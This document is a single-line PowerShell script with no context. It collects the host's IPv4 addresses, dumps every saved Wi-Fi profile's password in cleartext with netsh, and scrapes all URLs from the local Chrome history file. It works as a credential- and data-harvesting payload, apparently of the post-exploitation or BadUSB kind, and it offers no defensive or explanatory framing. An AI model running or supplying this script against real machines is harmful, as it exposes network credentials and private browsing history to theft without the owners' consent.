Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } | ForEach-Object { $ip = $_.IPAddress; netsh wlan show profiles | Select-String ':(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name=$name key=clear | Select-String 'Key Content\W+\:(.+)$' | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{ IPAddress = $ip; PROFILE_NAME = $name; PASSWORD = $pass } } } } | Format-Table -AutoSize; function Get-BrowserData { param ([string]$Browser, [string]$DataType) $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'; if ($Browser -eq 'chrome' -and $DataType -eq 'history') {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}; if (Test-Path $Path) { Write-Output "Chrome History"; Write-Output ("=" * 20); Write-Output ""; $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique; $Value | ForEach-Object { Write-Output $_ } } else { Write-Host "The path $Path does not exist." } }; Get-BrowserData -Browser "chrome" -DataType "history"
